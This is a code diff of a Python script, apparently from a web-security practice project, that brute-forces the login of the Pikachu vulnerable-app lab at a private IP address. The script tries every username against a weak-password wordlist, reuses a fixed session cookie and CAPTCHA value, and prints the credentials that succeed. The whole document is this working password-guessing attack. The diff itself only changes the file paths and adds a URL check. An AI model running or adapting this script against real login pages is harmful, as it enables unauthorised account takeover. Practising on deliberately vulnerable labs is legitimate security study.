@@ -2,9 +2,9 @@ import re
 import requests
 url = "http://192.168.1.192:8086/pikachu/vul/burteforce/bf_server.php"
 def burteforce_server(url):
-    with open('user.txt', 'r') as user:
+    with open('C:/Users/MZS/PycharmProjects/Web_Vulnerablility/burteforce/user.txt', 'r') as user:
         for username in user:
-            with open('弱口令1000', 'r') as passwd:
+            with open('C:/Users/MZS/PycharmProjects/Web_Vulnerablility/burteforce/口令', 'r') as passwd:
                 for password in passwd:
                     header = {
                         'Cookie': 'PHPSESSID=5r1bk8gn8nnipo6jnoaipg2tm3; security=impossible',
@@ -17,7 +17,7 @@ def burteforce_server(url):
                         'vcode': 'feijs7'  # 根据实际情况改动
                     }
                     res = requests.post(url=url, headers=header, data=data)
-                    if re.findall('login success', res.text):
+                    if re.findall('login success', res.text) and url == 'http://192.168.1.192:8086/pikachu/vul/burteforce/bf_server.php':
                         print('破解成功')
                         print("用户名是：", username.strip())
                         print("密码是：", password.strip())
